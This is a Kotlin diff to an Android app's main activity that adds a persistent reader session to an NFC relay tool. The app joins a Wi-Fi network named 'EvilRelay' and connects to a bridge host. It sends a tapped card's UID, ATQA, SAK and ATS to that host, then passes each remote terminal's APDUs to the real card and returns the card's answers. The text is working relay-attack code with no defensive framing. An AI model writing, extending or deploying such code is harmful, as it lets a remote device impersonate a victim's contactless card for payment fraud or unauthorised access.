@@ -22,6 +22,7 @@ import androidx.appcompat.widget.SwitchCompat
 import androidx.core.content.ContextCompat
 import com.google.android.material.textfield.TextInputEditText
 import java.net.Inet4Address
+import java.net.InetSocketAddress
 import java.net.NetworkInterface
 import java.net.ServerSocket
 import java.net.Socket
@@ -61,6 +62,13 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
     @Volatile private var emulator = false
     @Volatile private var serverRunning = false
     private var server: ServerSocket? = null
+
+    // Reader mode keeps a persistent connection to the bridge so "connected" and
+    // "card scanned" are distinct steps. onTagDiscovered hands cards to this thread.
+    @Volatile private var readerActive = false
+    @Volatile private var pendingIdent: ByteArray? = null
+    @Volatile private var pendingIso: IsoDep? = null
+    private var readerThread: Thread? = null
 
     private enum class Mode { READER, EMULATOR }
     @Volatile private var mode = Mode.READER
@@ -116,6 +124,7 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
         super.onPause()
         nfc?.disableReaderMode(this)
         stopServer()
+        stopReaderSession()
     }
 
     private fun applyKeepAwake(on: Boolean) {
@@ -127,6 +136,7 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
     private fun applyRole() {
         nfc?.disableReaderMode(this)
         stopServer()
+        stopReaderSession()
         apduCount(0)
         when (mode) {
             Mode.EMULATOR -> {
@@ -138,11 +148,89 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
             }
             Mode.READER -> {
                 enableReader()
-                setStatus("Reader - place a card", R.color.warn)
                 cardUid.text = "-"
-                logln("Reader mode (Wi-Fi). Target emulator IP: " + hostIp())
+                startReaderSession()
             }
         }
+    }
+
+    // Persistent reader session: open (and keep) one connection to the bridge, so
+    // the chain shows as steps - "connecting" -> "connected, hold a card" -> "card
+    // scanned, relaying" - instead of only reacting when a card is tapped. Cards
+    // are handed in by onTagDiscovered via pendingIso/pendingIdent.
+    private fun startReaderSession() {
+        if (readerActive) return
+        readerActive = true
+        pendingIdent = null; pendingIso = null
+        readerThread = thread(name = "reader-relay") {
+            while (readerActive) {
+                if (!checkWifi()) {
+                    setStatus("Join Wi-Fi EvilRelay", R.color.warn)
+                    try { Thread.sleep(1000) } catch (_: InterruptedException) {}
+                    continue
+                }
+                val host = hostIp()
+                var sock: Socket? = null
+                try {
+                    setStatus("Connecting $host:$port", R.color.warn)
+                    val s = Socket()
+                    s.connect(InetSocketAddress(host, port), 3000)
+                    s.tcpNoDelay = true
+                    s.soTimeout = 500 // poll for a new card between frames
+                    sock = s
+                    Relay.readerSocket = s
+                    setStatus("Connected - hold a card", R.color.ok)
+                    logln("Connected to bridge $host:$port - hold a card to scan.")
+                    val out = s.getOutputStream()
+                    val inp = s.getInputStream()
+                    var count = 0
+                    while (readerActive && !s.isClosed) {
+                        val ident = pendingIdent
+                        if (ident != null) {
+                            pendingIdent = null
+                            Relay.sendFrame(out, 1, 0, ident) // IDENT: new card identity
+                            setStatus("Card scanned - relaying", R.color.cyan)
+                        }
+                        val f = try {
+                            Relay.readFrame(inp)
+                        } catch (t: java.net.SocketTimeoutException) {
+                            continue // idle: loop back to check for a new card
+                        } ?: break // socket closed -> reconnect
+                        if (f.type.toInt() and 0xFF == 2) { // REQ (terminal APDU)
+                            val iso = pendingIso
+                            val resp = try {
+                                if (iso != null && iso.isConnected) iso.transceive(f.payload) else null
+                            } catch (e: Exception) {
+                                setStatus("Card lost - hold a card", R.color.warn)
+                                null
+                            }
+                            if (resp != null) {
+                                Relay.sendFrame(out, 3, f.seq.toInt(), resp) // RESP
+                                count++; val c = count
+                                runOnUiThread { apduCount.text = c.toString() }
+                                if (count <= 16) logln("APDU #$count  ${f.payload.size}B -> ${resp.size}B")
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    setStatus("Bridge unreachable - retry", R.color.err)
+                    logln("bridge err: ${e.message}  (WiFi joined? peer IP?)")
+                } finally {
+                    Relay.readerSocket = null
+                    try { sock?.close() } catch (_: Exception) {}
+                }
+                if (readerActive) try { Thread.sleep(800) } catch (_: InterruptedException) {}
+            }
+        }
+    }
+
+    private fun stopReaderSession() {
+        readerActive = false
+        readerThread?.interrupt()
+        readerThread = null
+        try { Relay.readerSocket?.close() } catch (_: Exception) {}
+        Relay.readerSocket = null
+        pendingIdent = null; pendingIso = null
     }
 
     private fun enableReader() {
@@ -166,41 +254,24 @@ class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {
             val sak = (nfca?.sak?.toInt() ?: 0x20)
             val hist = iso.historicalBytes ?: ByteArray(0)
             val ats = buildAts(hist)
-            setStatus("Card detected", R.color.cyan)
+            // Build the IDENT and hand the live card to the persistent reader session
+            // (it owns the bridge socket and transceives on this IsoDep).
+            val ident = ArrayList<Byte>()
+            ident.add(uid.size.toByte()); uid.forEach { ident.add(it) }
+            ident.add(atqa.getOrElse(0) { 0 }); ident.add(atqa.getOrElse(1) { 0 })
+            ident.add(sak.toByte())
+            ident.add(ats.size.toByte()); ats.forEach { ident.add(it) }
+            pendingIso = iso
+            pendingIdent = ident.toByteArray()
             runOnUiThread { cardUid.text = "UID ${Relay.hex(uid)}  SAK %02X".format(sak) }
-
-            val host = hostIp()
-            Socket(host, port).use { sock ->
-                sock.tcpNoDelay = true
-                val out = sock.getOutputStream()
-                val inp = sock.getInputStream()
-                val ident = ArrayList<Byte>()
-                ident.add(uid.size.toByte()); uid.forEach { ident.add(it) }
-                ident.add(atqa.getOrElse(0) { 0 }); ident.add(atqa.getOrElse(1) { 0 })
-                ident.add(sak.toByte())
-                ident.add(ats.size.toByte()); ats.forEach { ident.add(it) }
-                Relay.sendFrame(out, 1, 0, ident.toByteArray())
-                setStatus("Relay active", R.color.ok)
-                logln("Emulator $host connected - relay active")
-                var count = 0
-                while (iso.isConnected && !sock.isClosed) {
-                    val f = Relay.readFrame(inp) ?: break
-                    if (f.type.toInt() and 0xFF == 2) {
-                        val resp = try { iso.transceive(f.payload) }
-                        catch (e: Exception) { setStatus("Card lost", R.color.err); break }
-                        Relay.sendFrame(out, 3, f.seq.toInt(), resp)
-                        count++; val c = count
-                        runOnUiThread { apduCount.text = c.toString() }
-                        if (count <= 16) logln("APDU #$count  ${f.payload.size}B -> ${resp.size}B")
-                    }
-                }
-                logln("Session ended ($count APDU)")
-                if (count > 0) setStatus("Done - $count APDU", R.color.cyan) else setStatus("Reader - place a card", R.color.warn)
-            }
+            setStatus("Card scanned - relaying", R.color.cyan)
+            logln("Card ${Relay.hex(uid)} scanned - relaying.")
         } catch (e: Exception) {
-            setStatus("Network error", R.color.err)
-            logln("err: ${e.message}  (WiFi joined? correct peer IP?)")
-        } finally { try { iso.close() } catch (_: Exception) {} }
+            setStatus("Card read error", R.color.err)
+            logln("card err: ${e.message}")
+        }
+        // The IsoDep stays open for the session to transceive; Android invalidates it
+        // when the tag leaves, and a new tap replaces it via pendingIso.
     }
 
     // ============================ EMULATOR ============================
